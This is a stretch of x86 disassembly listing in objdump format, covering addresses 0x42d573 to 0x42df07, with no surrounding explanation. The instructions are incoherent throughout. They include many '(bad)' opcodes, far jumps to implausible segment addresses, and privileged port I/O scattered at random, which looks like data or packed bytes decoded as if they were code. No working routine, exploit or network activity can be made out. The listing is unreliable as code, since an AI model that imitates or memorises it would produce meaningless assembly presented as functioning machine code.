  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xa628a4d5,eax
  42d583:	xchg   esp,eax
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x45000001,al
  42d58d:	dec    ebp
  42d58e:	mov    ch,0xfc
  42d590:	and    al,BYTE PTR [esp+ebp*1-0x10]
  42d594:	fiadd  DWORD PTR [ecx+edi*4-0xf05d7e3]
  42d59b:	jno    0x42d5e7
  42d59d:	call   0x2b9036db
  42d5a2:	adc    al,0x21
  42d5a4:	das    
  42d5a5:	sbb    eax,0xeca8221
  42d5aa:	xchg   esp,eax
  42d5ab:	aam    0x42
  42d5ad:	xchg   ebp,eax
  42d5ae:	int    0x1c
  42d5b0:	ret    0x1e42
  42d5b3:	pop    esi
  42d5b5:	in     eax,0x6e
  42d5b7:	sbb    ah,BYTE PTR [edx]
  42d5b9:	data16 mov bh,0x28
  42d5bc:	jmp    0x457ae7c0
  42d5c1:	sbb    BYTE PTR [ecx+0x138c617a],ah
  42d5c7:	out    dx,al
  42d5c8:	jmp    esp
  42d5ca:	out    dx,al
  42d5cb:	popf   
  42d5cc:	add    eax,DWORD PTR [ebx-0x5]
  42d5cf:	jo     0x42d579
  42d5d1:	loope  0x42d602
  42d5d3:	sub    dh,BYTE PTR [esi+0xc85b5c2]
  42d5d9:	cmp    ecx,eax
  42d5db:	addr16 loopne 0x42d57f
  42d5de:	xor    eax,0xe0f1c083
  42d5e3:	mov    ds:0x9efe671d,al
  42d5e8:	or     eax,0x2b0dc932
  42d5ed:	pop    esp
  42d5ee:	cmp    bh,BYTE PTR [ecx+edi*4-0x2c]
  42d5f2:	data16 in al,dx
  42d5f4:	shl    bh,cl
  42d5f6:	lock mov eax,ds:0x84fcdae3
  42d5fc:	jmp    0xeb81f69c
  42d601:	cwde   
  42d602:	cmp    al,0x7b
  42d604:	add    BYTE PTR [edi],ch
  42d606:	dec    edi
  42d607:	cmp    BYTE PTR [esi+0x41],0xef
  42d60b:	mov    al,0xdd
  42d60d:	dec    eax
  42d60e:	ret    0x4ceb
  42d611:	pop    ebp
  42d612:	daa    
  42d613:	gs sti 
  42d615:	fcomp  DWORD PTR [edx*8+0x1bd33a67]
  42d61c:	(bad)  
  42d61d:	sbb    edi,DWORD PTR ds:0xc1a3f300
  42d623:	ins    DWORD PTR es:[edi],dx
  42d624:	std    
  42d625:	pop    esi
  42d626:	(bad)  
  42d627:	or     DWORD PTR [edx],eax
  42d629:	mov    WORD PTR [edx+0x39],?
  42d62c:	scas   al,BYTE PTR es:[edi]
  42d62d:	dec    ebp
  42d62e:	adc    esi,ecx
  42d630:	xlat   BYTE PTR ds:[ebx]
  42d631:	dec    ebx
  42d632:	jmp    0x620c:0x523e10d7
  42d639:	test   eax,0x43aff0a4
  42d63e:	or     eax,eax
  42d640:	hlt    
  42d641:	(bad)  
  42d642:	jecxz  0x42d6a2
  42d644:	pop    edi
  42d645:	pusha  
  42d646:	cld    
  42d647:	out    dx,al
  42d648:	or     BYTE PTR [esi],ch
  42d64a:	mov    ebp,0xd0e51e5e
  42d64f:	ret    
  42d650:	jbe    0x42d5df
  42d652:	dec    ebx
  42d653:	mov    cl,0x2
  42d655:	imul   ebx,DWORD PTR [ebx-0x6b],0xcc009506
  42d65c:	mov    esi,0x475f5021
  42d661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d662:	adc    edx,DWORD PTR [eax-0x53ada3cf]
  42d668:	rcl    ch,0x1e
  42d66b:	shl    esi,1
  42d66d:	and    ebp,DWORD PTR [ebp-0x7c]
  42d670:	and    al,0x5d
  42d672:	cmp    DWORD PTR [edx+0x3ff3be72],esi
  42d678:	out    0x65,eax
  42d67a:	jp     0x42d648
  42d67c:	adc    BYTE PTR [edx-0x1dad6ac1],bh
  42d682:	call   0x4f22fb50
  42d687:	xor    ecx,ebp
  42d689:	add    al,0xe8
  42d68b:	push   es
  42d68c:	mov    esi,0x901da16f
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xa4
  42d701:	inc    ecx
  42d702:	enter  0x2c08,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x47000001
  42d70d:	pop    ds
  42d70e:	or     eax,0x8be0ffe2
  42d713:	fnsave ds:0x8428f1c7
  42d719:	imul   esi,DWORD PTR [eax+0x4eb015cc],0x59e30c5e
  42d723:	loope  0x42d709
  42d725:	rcl    DWORD PTR [esi],1
  42d727:	pop    ds
  42d728:	repz fnsave [edx+0x26b8fe14]
  42d72f:	es sub ch,dh
  42d732:	jecxz  0x42d7ad
  42d734:	adc    esp,esp
  42d736:	xor    DWORD PTR [ebx-0x71],ecx
  42d739:	push   ebp
  42d73a:	mov    DWORD PTR [ebx+eiz*1],eax
  42d73d:	push   es
  42d73e:	pop    ebp
  42d73f:	and    DWORD PTR [esi+0x1e],eax
  42d742:	xor    al,dh
  42d744:	cmp    bl,bh
  42d746:	mov    WORD PTR [ebp+0x27],?
  42d749:	push   esp
  42d74a:	or     BYTE PTR [ecx],ah
  42d74c:	into   
  42d74d:	arpl   WORD PTR [edx-0x694f9c4b],sp
  42d753:	mov    eax,ds:0x555fd36d
  42d758:	stos   DWORD PTR es:[edi],eax
  42d759:	mov    ds,WORD PTR [eax+eax*1+0x9383cf0]
  42d760:	xor    al,0x11
  42d762:	ficomp WORD PTR [eax]
  42d764:	pop    edx
  42d765:	push   ecx
  42d766:	jns    0x42d7be
  42d768:	fld    st(7)
  42d76a:	xor    dh,bh
  42d76c:	fwait
  42d76d:	lock sar DWORD PTR [edx-0x5c9ef86e],cl
  42d774:	ins    BYTE PTR es:[edi],dx
  42d775:	add    al,0xf4
  42d777:	outs   dx,DWORD PTR ds:[esi]
  42d778:	sbb    al,0xc1
  42d77a:	mov    al,BYTE PTR [ebp-0x55]
  42d77d:	lock xchg edx,eax
  42d77f:	push   edx
  42d780:	mov    ds:0xf5f03e29,eax
  42d785:	lods   eax,DWORD PTR ds:[esi]
  42d786:	jbe    0x42d7f9
  42d788:	push   ebp
  42d789:	jb     0x42d7bf
  42d78b:	dec    esi
  42d78c:	je     0x42d7cf
  42d78e:	mov    eax,ds:0x779afec1
  42d793:	je     0x42d7b9
  42d795:	mov    edi,0x9180ae8e
  42d79a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d79b:	sbb    DWORD PTR [ebp-0x71],esi
  42d79e:	(bad)  
  42d79f:	sub    bh,ch
  42d7a1:	cs pop edx
  42d7a3:	mov    DWORD PTR [edi-0x1a],0x50f769b
  42d7aa:	cmp    edx,DWORD PTR [edx+0x22]
  42d7ad:	mov    dl,0x3c
  42d7af:	iret   
  42d7b0:	out    dx,al
  42d7b1:	sbb    eax,0x8fd19454
  42d7b6:	pop    esi
  42d7b7:	inc    edx
  42d7b8:	xor    cl,BYTE PTR [eax]
  42d7ba:	cld    
  42d7bb:	cwde   
  42d7bc:	xor    BYTE PTR [edi+0x45],ah
  42d7bf:	push   cs
  42d7c0:	lods   eax,DWORD PTR ds:[esi]
  42d7c1:	jl     0x42d760
  42d7c3:	adc    al,0x19
  42d7c5:	mov    bl,0x44
  42d7c7:	imul   esp,DWORD PTR [ecx+ecx*8-0xc0e602f],0x5d
  42d7cf:	icebp  
  42d7d0:	into   
  42d7d1:	scas   eax,DWORD PTR es:[edi]
  42d7d2:	sahf   
  42d7d3:	lock jge 0x42d816
  42d7d6:	outs   dx,BYTE PTR ds:[esi]
  42d7d7:	jne    0x42d83c
  42d7d9:	test   al,0xdb
  42d7db:	push   0x6644991c
  42d7e0:	mov    WORD PTR [edx+0x3abf9acc],ss
  42d7e6:	sub    DWORD PTR [edx+0x6],ebp
  42d7e9:	sub    eax,0xf451a13a
  42d7ee:	and    DWORD PTR [ecx+0x69],esi
  42d7f1:	jo     0x42d7cc
  42d7f3:	mov    ah,0xe
  42d7f5:	xchg   ebx,eax
  42d7f6:	int3   
  42d7f7:	push   ebp
  42d7f8:	add    al,BYTE PTR [ebp+edx*1+0x59b84c25]
  42d7ff:	ret    
  42d800:	sbb    DWORD PTR [ecx+eax*8+0x2],eax
  42d804:	ins    BYTE PTR es:[edi],dx
  42d805:	sbb    eax,ecx
  42d807:	pop    ecx
  42d808:	aam    0x49
  42d80a:	jbe    0x42d881
  42d80c:	pop    ss
  42d80d:	sti    
  42d80e:	and    al,0x55
  42d810:	mov    ebp,0x0
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x43c6961a
  42d881:	mov    ds:0xe8310c56,eax
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0x60000001
  42d88d:	adc    DWORD PTR [edx-0x1],ecx
  42d890:	into   
  42d891:	xor    BYTE PTR [ebx+0x12],al
  42d894:	call   0x6cde812f
  42d899:	iret   
  42d89a:	leave  
  42d89b:	sbb    esp,DWORD PTR ds:0x9958be22
  42d8a1:	js     0x42d88d
  42d8a3:	fld    DWORD PTR ds:0xbd0a1b8b
  42d8a9:	push   ds
  42d8aa:	imul   ebx,DWORD PTR [esi-0x34],0xffffffd7
  42d8ae:	push   ecx
  42d8af:	das    
  42d8b0:	mov    cl,0x42
  42d8b2:	push   esi
  42d8b3:	in     eax,dx
  42d8b4:	sub    al,BYTE PTR [edi+0x73128069]
  42d8ba:	dec    ebx
  42d8bb:	popf   
  42d8bc:	daa    
  42d8bd:	arpl   WORD PTR ds:0xc8073cfb,bx
  42d8c3:	xor    DWORD PTR [ecx+0x20],ebx
  42d8c6:	jbe    0x42d8f3
  42d8c8:	push   esi
  42d8c9:	test   eax,0x10d62f07
  42d8ce:	push   0xfffffffe
  42d8d0:	push   ss
  42d8d1:	sub    eax,0x36045885
  42d8d6:	mov    eax,ds:0x3b3c27dd
  42d8db:	popa   
  42d8dc:	outs   dx,DWORD PTR ds:[esi]
  42d8dd:	repnz inc ecx
  42d8df:	xchg   ebx,eax
  42d8e0:	daa    
  42d8e1:	mov    esp,0xd783b558
  42d8e6:	mov    ecx,0xc27be5ea
  42d8eb:	xor    ecx,DWORD PTR [ebx]
  42d8ed:	les    eax,FWORD PTR [edi-0x4b]
  42d8f0:	sub    BYTE PTR [ebx-0x14],al
  42d8f3:	outs   dx,DWORD PTR ds:[esi]
  42d8f4:	sbb    BYTE PTR [eax-0x32],dh
  42d8f7:	jmp    0xd293:0xc550a03d
  42d8fe:	jb     0x42d8dd
  42d900:	adc    bh,BYTE PTR [edx-0x19545324]
  42d906:	or     al,0xa7
  42d908:	cmp    BYTE PTR [eax],al
  42d90a:	rcr    BYTE PTR ss:[eax+0x29],1
  42d90e:	stos   DWORD PTR es:[edi],eax
  42d90f:	and    al,BYTE PTR [ebp-0x75c1cef0]
  42d915:	scas   al,BYTE PTR es:[edi]
  42d916:	fsub   DWORD PTR cs:[edx-0x6c]
  42d91a:	mov    edi,DWORD PTR [esp+ebx*2]
  42d91d:	mov    bh,0x21
  42d91f:	mov    dh,0xf6
  42d921:	jns    0x42d99c
  42d923:	and    BYTE PTR [edx+0x6ea7700],bh
  42d929:	fadd   st,st(4)
  42d92b:	jae    0x42d916
  42d92d:	sbb    ch,bl
  42d92f:	stc    
  42d930:	rcl    DWORD PTR [esi],1
  42d932:	or     eax,0x9ddeaf9
  42d937:	lea    ebx,[ecx]
  42d939:	icebp  
  42d93a:	cmp    eax,0xdcacee61
  42d93f:	fldlg2 
  42d941:	loop   0x42d93a
  42d943:	stc    
  42d944:	add    al,0x94
  42d946:	sbb    al,0x6f
  42d948:	or     DWORD PTR [ebx],esp
  42d94a:	test   DWORD PTR [eax],edx
  42d94c:	xor    eax,DWORD PTR ss:[ecx-0x64]
  42d950:	sar    eax,0xa2
  42d953:	adc    al,0x73
  42d955:	xchg   esi,eax
  42d956:	sub    al,0xa2
  42d958:	cs and eax,0x6efd4146
  42d95e:	xor    BYTE PTR [ecx-0x9],dl
  42d961:	sub    eax,0x5fbbe795
  42d966:	cwde   
  42d967:	and    eax,DWORD PTR [edx+eax*1]
  42d96a:	adc    esi,DWORD PTR [edx-0x37b7be3e]
  42d970:	mov    dh,0xac
  42d972:	add    eax,DWORD PTR [ecx+0x591ed68c]
  42d978:	xchg   edi,eax
  42d979:	cmc    
  42d97a:	or     ch,BYTE PTR [eax]
  42d97c:	mov    cl,0xa4
  42d97e:	mov    esp,0xaca5c72c
  42d983:	dec    eax
  42d984:	aam    0x3d
  42d986:	mov    edx,gs
  42d988:	or     al,0xca
  42d98a:	retf   
  42d98b:	test   BYTE PTR [ebx-0x876ce98],cl
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	push   ebp
  42da01:	add    eax,0xe9362f6b
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    eax,0x6b000001
  42da0d:	daa    
  42da0e:	and    dl,BYTE PTR [edi+ecx*8+0x47]
  42da12:	enter  0xf99d,0xc4
  42da16:	dec    edx
  42da17:	jmp    0xd4cf:0xb938e41a
  42da1e:	pop    eax
  42da1f:	sub    BYTE PTR [ebp+0x6b06412f],ch
  42da25:	retf   
  42da26:	sub    BYTE PTR [ebx+ecx*4-0x4d],bl
  42da2a:	loopne 0x42d9c8
  42da2c:	xchg   edx,eax
  42da2d:	hlt    
  42da2e:	dec    esp
  42da2f:	push   eax
  42da30:	fsubr  QWORD PTR [ecx-0x49]
  42da33:	test   BYTE PTR [ebx],al
  42da35:	aam    0x84
  42da37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da38:	in     eax,0x48
  42da3a:	jnp    0x42da31
  42da3c:	fwait
  42da3d:	scas   al,BYTE PTR es:[edi]
  42da3e:	pusha  
  42da3f:	lods   eax,DWORD PTR ds:[esi]
  42da40:	rcr    BYTE PTR ds:[ebx-0x2015708b],cl
  42da47:	inc    ebx
  42da48:	push   0xffffffd7
  42da4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da4b:	xchg   edi,eax
  42da4c:	push   ecx
  42da4d:	loopne 0x42d9f3
  42da4f:	push   cs
  42da50:	mov    cl,0x67
  42da52:	and    BYTE PTR [ecx+0x54],bh
  42da55:	cmp    cl,dl
  42da57:	cmp    eax,0xb88a957d
  42da5c:	pop    eax
  42da5d:	xchg   BYTE PTR [eax],ch
  42da5f:	pop    ebx
  42da60:	pop    esp
  42da61:	pushf  
  42da62:	mov    al,ds:0x7592b4c0
  42da67:	cmp    DWORD PTR [ebp-0x2d],0xa65e2228
  42da6e:	ins    DWORD PTR es:[edi],dx
  42da6f:	dec    ebp
  42da70:	lods   al,BYTE PTR ds:[esi]
  42da71:	out    dx,eax
  42da72:	xchg   ebp,eax
  42da73:	or     eax,0xed059a63
  42da78:	jmp    0x42dacc
  42da7a:	aaa    
  42da7b:	xor    ecx,edx
  42da7d:	cmp    bh,dl
  42da7f:	(bad)  
  42da80:	adc    ebx,edi
  42da82:	add    eax,0x51b68b24
  42da87:	sbb    al,ah
  42da89:	ds dec edi
  42da8b:	clc    
  42da8c:	inc    esi
  42da8d:	mov    esi,0xca938b5c
  42da92:	cld    
  42da93:	jg     0x42da1e
  42da95:	lea    edx,[ecx+0x5a90b7a0]
  42da9b:	stos   BYTE PTR es:[edi],al
  42da9c:	sub    al,0x45
  42da9e:	mov    DWORD PTR [edi+0xc],0x67eaac33
  42daa5:	sbb    DWORD PTR [edx+eiz*4+0x4920541b],0x3d690800
  42dab0:	ja     0x42db0c
  42dab2:	test   DWORD PTR [esp],ecx
  42dab5:	sub    ebx,DWORD PTR [ecx-0x6e]
  42dab8:	push   edi
  42dab9:	inc    esi
  42daba:	inc    edi
  42dabb:	icebp  
  42dabc:	ret    0x4e37
  42dabf:	pop    es
  42dac0:	and    esi,ecx
  42dac2:	mov    eax,ds:0xc46962a7
  42dac7:	add    DWORD PTR [ebx+0x6a],ebp
  42daca:	sub    ch,BYTE PTR [edi+0x13c1b105]
  42dad0:	push   edi
  42dad1:	mov    al,ds:0xa55ab198
  42dad6:	jbe    0x42da7a
  42dad8:	fwait
  42dad9:	adc    DWORD PTR [ebx+ebp*2],ebp
  42dadc:	fld    DWORD PTR [edi]
  42dade:	push   esi
  42dadf:	(bad)  
  42dae0:	push   0x2f
  42dae2:	jge    0x42dab7
  42dae4:	and    BYTE PTR [esi],0xa0
  42dae7:	(bad)  
  42dae8:	fs jo  0x42dab7
  42daeb:	cwde   
  42daec:	ins    DWORD PTR es:[edi],dx
  42daed:	retf   0xeff3
  42daf0:	fbld   TBYTE PTR [ebp+0x69a22eec]
  42daf6:	sbb    BYTE PTR [ebx-0x53],cl
  42daf9:	pop    ss
  42dafa:	xchg   ebp,eax
  42dafb:	pop    eax
  42dafc:	int    0xc3
  42dafe:	push   ds
  42daff:	jg     0x42db75
  42db01:	js     0x42db44
  42db03:	cmp    al,0x23
  42db05:	and    ebp,ecx
  42db07:	lea    edx,[ecx+esi*8-0x7]
  42db0b:	int3   
  42db0c:	adc    al,0x88
  42db0e:	rcr    BYTE PTR [ebp+0xd],1
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db56
  42db81:	adc    ebx,0x3f
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x83000001
  42db8d:	push   ebx
  42db8e:	cmp    ah,BYTE PTR [eax+0x5f91a46]
  42db94:	stc    
  42db95:	ins    BYTE PTR es:[edi],dx
  42db96:	push   esi
  42db97:	cmc    
  42db98:	jbe    0x42dbd7
  42db9a:	(bad)  
  42db9b:	hlt    
  42db9c:	arpl   WORD PTR [eax+0x55],di
  42db9f:	adc    ah,BYTE PTR [edi+0x29629e99]
  42dba5:	es in  eax,dx
  42dba7:	mov    eax,0x386fb82
  42dbac:	call   0x92328d44
  42dbb1:	jo     0x42dbdf
  42dbb3:	mov    bl,ah
  42dbb5:	jno    0x42dc00
  42dbb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbb8:	jns    0x42dbeb
  42dbba:	(bad)
  42dbbe:	sbb    eax,0xdee362e7
  42dbc3:	leave  
  42dbc4:	xor    al,0x4f
  42dbc6:	in     al,0xd2
  42dbc8:	lods   eax,DWORD PTR ds:[esi]
  42dbc9:	jo     0x42dc44
  42dbcb:	js     0x42db57
  42dbcd:	push   esi
  42dbce:	push   esi
  42dbcf:	aam    0x43
  42dbd1:	mov    dh,0xe
  42dbd3:	scas   al,BYTE PTR es:[edi]
  42dbd4:	lds    edx,FWORD PTR [ebx]
  42dbd6:	mov    ah,0xa4
  42dbd8:	cdq    
  42dbd9:	jno    0x42dc51
  42dbdb:	push   esi
  42dbdc:	jmp    0x42db7d
  42dbde:	mov    ds:0x67457000,eax
  42dbe3:	je     0x42dc61
  42dbe5:	cmp    eax,0x577d8ee1
  42dbea:	add    cl,ah
  42dbec:	push   es
  42dbed:	xor    ebx,DWORD PTR [ecx]
  42dbef:	cs sbb dl,dh
  42dbf2:	out    dx,eax
  42dbf3:	sbb    BYTE PTR [ecx+0x2c],ah
  42dbf6:	shl    BYTE PTR [edi-0x22494c24],cl
  42dbfc:	pop    ds
  42dbfd:	jmp    0x9d6472ad
  42dc02:	fadd   DWORD PTR [edi]
  42dc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc06:	push   es
  42dc07:	adc    eax,0xf9318d9f
  42dc0c:	mov    esi,DWORD PTR [esi]
  42dc0e:	gs enter 0xa5b1,0x86
  42dc13:	fwait
  42dc14:	and    al,0x46
  42dc16:	mov    al,ds:0x97efc0ed
  42dc1b:	cmp    eax,0x8ce9a0c7
  42dc20:	addr16 cmp edi,ebx
  42dc23:	pop    esi
  42dc24:	leave  
  42dc25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc26:	push   eax
  42dc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc28:	adc    bh,BYTE PTR [edi]
  42dc2a:	sar    ecx,cl
  42dc2c:	mov    esp,0x837a6e5e
  42dc31:	fs icebp 
  42dc33:	call   FWORD PTR [ebx-0x1b]
  42dc36:	xchg   esi,eax
  42dc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc38:	mov    eax,ds:0xf3838fd8
  42dc3d:	and    BYTE PTR [ecx-0x7ce1be12],0xa4
  42dc44:	inc    eax
  42dc45:	retf   
  42dc46:	icebp  
  42dc47:	in     al,0xba
  42dc49:	test   DWORD PTR [ecx+ebx*4+0x78f684a],edx
  42dc50:	cdq    
  42dc51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc52:	iret   
  42dc53:	pop    ss
  42dc54:	rol    BYTE PTR [ebp+0x7e],0x9a
  42dc58:	das    
  42dc59:	outs   dx,DWORD PTR ds:[esi]
  42dc5a:	enter  0x9fd8,0xe
  42dc5e:	das    
  42dc5f:	xchg   esi,eax
  42dc60:	pop    es
  42dc61:	ins    DWORD PTR es:[edi],dx
  42dc62:	cmp    BYTE PTR [ecx],dh
  42dc64:	jl     0x42dc86
  42dc66:	xchg   ecx,eax
  42dc67:	xor    edi,DWORD PTR [edx-0x62b14ab]
  42dc6d:	loope  0x42dc17
  42dc6f:	cmp    ah,dl
  42dc71:	data16 (bad) 
  42dc73:	(bad)  
  42dc74:	jb     0x42dcef
  42dc76:	jmp    0x6f1:0x9cabcd94
  42dc7d:	inc    edx
  42dc7e:	pop    es
  42dc7f:	icebp  
  42dc80:	dec    ebx
  42dc81:	xor    ah,ah
  42dc83:	(bad)  
  42dc84:	out    0x5,al
  42dc86:	mov    esi,0x5a150a56
  42dc8b:	shl    DWORD PTR [ecx],1
  42dc8d:	test   al,0xad
  42dc8f:	cwde   
  42dc90:	aaa    
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	lods   eax,DWORD PTR ds:[esi]
  42dd01:	stc    
  42dd02:	loopne 0x42dcd8
  42dd04:	inc    eax
  42dd05:	jmp    0x42dd08
  42dd07:	add    BYTE PTR ds:0xae000001,al
  42dd0d:	inc    edx
  42dd0e:	imul   ebp,edx,0x7f468529
  42dd14:	jns    0x42dce7
  42dd16:	div    BYTE PTR [eax-0x80]
  42dd19:	jmp    0x42dd04
  42dd1b:	xchg   bl,cl
  42dd1d:	xchg   DWORD PTR [edi+0x1b685357],ebx
  42dd23:	or     BYTE PTR [ebx+0x6ebf4cc0],ch
  42dd29:	xchg   esp,eax
  42dd2a:	and    bh,BYTE PTR [esi+0x11]
  42dd2d:	or     eax,0xb5e42887
  42dd32:	jg     0x42dd64
  42dd34:	dec    ebp
  42dd35:	in     eax,0x4b
  42dd37:	and    bl,bh
  42dd39:	lahf   
  42dd3a:	sub    BYTE PTR [edx-0x4a61a497],dl
  42dd40:	aad    0xa7
  42dd42:	out    dx,al
  42dd43:	shl    DWORD PTR [ebx+0x46d8dfe9],0x8c
  42dd4a:	add    BYTE PTR [ecx+0x3e5c56e1],0x3
  42dd51:	jne    0x42dda8
  42dd53:	cs ins BYTE PTR es:[edi],dx
  42dd55:	xor    eax,0x90b534f
  42dd5a:	jbe    0x42dce1
  42dd5c:	dec    esp
  42dd5d:	dec    edx
  42dd5e:	fld    DWORD PTR [edx]
  42dd60:	outs   dx,BYTE PTR ds:[esi]
  42dd61:	test   al,0xf6
  42dd63:	into   
  42dd64:	in     eax,0x7c
  42dd66:	call   0xeb50c11a
  42dd6b:	inc    edx
  42dd6c:	fsubr  QWORD PTR [edx+0x2a]
  42dd6f:	out    0x9a,al
  42dd71:	mov    ch,0xe6
  42dd73:	mov    ah,BYTE PTR [esi]
  42dd75:	dec    eax
  42dd76:	add    ecx,ebx
  42dd78:	push   ecx
  42dd79:	jge    0x42ddb8
  42dd7b:	bound  edi,QWORD PTR [ebp+edx*4+0x631d0b26]
  42dd82:	xor    ch,BYTE PTR [ebx+eiz*1+0x2c]
  42dd86:	lods   eax,DWORD PTR ds:[esi]
  42dd87:	(bad)  
  42dd89:	pop    esi
  42dd8a:	shl    BYTE PTR [esi+0x36],cl
  42dd8d:	(bad)  
  42dd8f:	into   
  42dd90:	outs   dx,BYTE PTR ds:[esi]
  42dd91:	js     0x42de06
  42dd93:	jnp    0x42dd70
  42dd95:	sbb    DWORD PTR [eax-0x4b7164c9],0xffffffb8
  42dd9c:	fisub  WORD PTR [ebx+0x7d66a9d2]
  42dda2:	(bad)
  42dda5:	jne    0x42dd36
  42dda7:	mov    bl,0xbe
  42dda9:	pusha  
  42ddaa:	inc    esp
  42ddab:	fld    DWORD PTR [ebx]
  42ddad:	pop    ecx
  42ddae:	inc    ebp
  42ddaf:	shl    ah,cl
  42ddb1:	pop    es
  42ddb2:	or     BYTE PTR [ebx],0x7e
  42ddb5:	imul   esp,DWORD PTR [ecx],0xffffffa8
  42ddb8:	adc    ch,bh
  42ddba:	dec    ebp
  42ddbb:	lds    esp,FWORD PTR [edi]
  42ddbd:	dec    ebx
  42ddbe:	dec    esp
  42ddbf:	outs   dx,BYTE PTR ds:[esi]
  42ddc0:	and    eax,0x9812dcb6
  42ddc5:	push   esp
  42ddc6:	shl    edi,1
  42ddc8:	mov    dl,0x7
  42ddca:	call   0x84ba995f
  42ddcf:	adc    al,0x94
  42ddd1:	popf   
  42ddd2:	ins    DWORD PTR es:[edi],dx
  42ddd3:	add    DWORD PTR [eax],ebp
  42ddd5:	dec    edi
  42ddd6:	shl    DWORD PTR [ebx-0x1659382d],0x8f
  42dddd:	inc    ecx
  42ddde:	or     al,0x5b
  42dde0:	mov    eax,DWORD PTR [edi+0x2e]
  42dde3:	or     DWORD PTR [eax-0x7ed218c3],0xffffff86
  42ddea:	or     DWORD PTR [ebx],ebp
  42ddec:	aam    0x66
  42ddee:	call   0xabe1:0xfb47104b
  42ddf5:	es ret 
  42ddf7:	fistp  WORD PTR [ebp+edi*1-0x4b7e3b8e]
  42ddfe:	stc    
  42ddff:	xchg   esi,eax
  42de00:	xor    DWORD PTR [esi-0x32e801ce],0xfffffff9
  42de07:	clc    
  42de08:	loopne 0x42dde3
  42de0a:	add    DWORD PTR [edi],0xcc6f9df3
  42de10:	jmp    0x42de12
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	call   0x4594ad1f
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x9e000001
  42de8d:	rcr    DWORD PTR [eax],0x43
  42de90:	pop    ds
  42de91:	dec    esp
  42de92:	in     eax,0x91
  42de94:	sub    eax,0xd428cecb
  42de99:	inc    eax
  42de9a:	push   ebp
  42de9b:	fs or  eax,0x8066d975
  42dea1:	mov    esi,0x42b602f4
  42dea6:	push   ebp
  42dea7:	icebp  
  42dea8:	imul   edx,DWORD PTR [ebp+eiz*2-0x380df10a],0xffffffa1
  42deb0:	xor    BYTE PTR [edx-0x64746685],dh
  42deb6:	stc    
  42deb7:	aas    
  42deb8:	pop    esi
  42deb9:	lods   al,BYTE PTR ds:[esi]
  42deba:	retf   0x370
  42debd:	(bad)  
  42debe:	sub    al,0xf9
  42dec0:	gs inc ebp
  42dec2:	or     eax,0x4873c819
  42dec7:	in     al,0x73
  42dec9:	cmp    al,0x6f
  42decb:	lods   al,BYTE PTR ds:[esi]
  42decc:	add    ebx,DWORD PTR [ebx]
  42dece:	(bad)  
  42decf:	cmc    
  42ded0:	sar    DWORD PTR [edx],1
  42ded2:	inc    ebx
  42ded3:	xchg   edi,eax
  42ded4:	loope  0x42deb7
  42ded6:	fst    DWORD PTR [ecx-0x4a]
  42ded9:	add    cl,BYTE PTR [esi-0x2b70ee89]
  42dedf:	int3   
  42dee0:	out    dx,al
  42dee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dee2:	mov    WORD PTR [ecx+esi*8+0x4d],?
  42dee6:	loopne 0x42df13
  42dee8:	add    DWORD PTR [ebx],ebx
  42deea:	mov    BYTE PTR [edi],bh
  42deec:	mov    dh,0x34
  42deee:	jmp    0x42de8f
  42def0:	mov    ch,0xbd
  42def2:	out    dx,eax
  42def3:	fmul   QWORD PTR [edx+0x5d2872ee]
  42def9:	xchg   esp,eax
  42defa:	push   ebx
  42defb:	je     0x42deab
  42defd:	imul   edi,DWORD PTR [ebx-0x74feb156],0xec283449
  42df07:	ins    BYTE PTR es:[edi],dx
